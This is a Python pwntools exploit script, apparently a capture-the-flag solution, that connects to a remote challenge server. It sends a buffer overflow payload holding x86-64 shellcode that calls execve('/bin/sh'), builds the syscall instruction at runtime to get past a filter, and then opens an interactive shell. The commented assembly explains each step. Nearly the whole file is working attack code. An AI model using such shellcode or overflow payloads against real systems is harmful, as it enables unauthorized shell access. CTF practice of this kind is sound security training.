#!/usr/bin/python
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

#r = process("./syscall")
'''
gdb.attach(r, """
	b *0x401270
	c
	""")
'''
r = remote("actf.jinblack.it", 4001)
#input("wait")

#Address of the start of the shellcode
buf = 0x404088

binsh = b"/bin/sh\x00"

#Shellcode with at the end 166 null bytes to fill the buffer and the address to overwrite the return address

shellcode = binsh + b"\x48\xC7\xC7\x80\x40\x40\x00\x48\xC7\xC6\xC0\x40\x40\x00\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x49\xC7\xC3\x0E\x05\x00\x00\x49\x83\xC3\x01\x4C\x89\x1D\x00\x00\x00\x00"  + b"\x00" * 166 + p64(buf) + b"\x00"*8

r.send(shellcode)
time.sleep(0.1)

r.interactive()


'''
shellcode: \x48\xC7\xC7\x80\x40\x40\x00\x48\xC7\xC6\xC0\x40\x40\x00\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x49\xC7\xC3\x0E\x05\x00\x00\x49\x83\xC3\x01\x4C\x89\x1D\x00\x00\x00\x00:

Assembly of the shellcode:

adress of /bin/sh
mov rdi, 0x404080

adress of some 0
mov rsi, 0x4040c0

copy 0
mov rdx,rsi

make the system to execute execve
mov rax,0x3b

builds 0x050f --> syscall
mov r11, 0x050e
add r11, 1

change the instruction pointer to execute the syscall
mov [rip], r11'''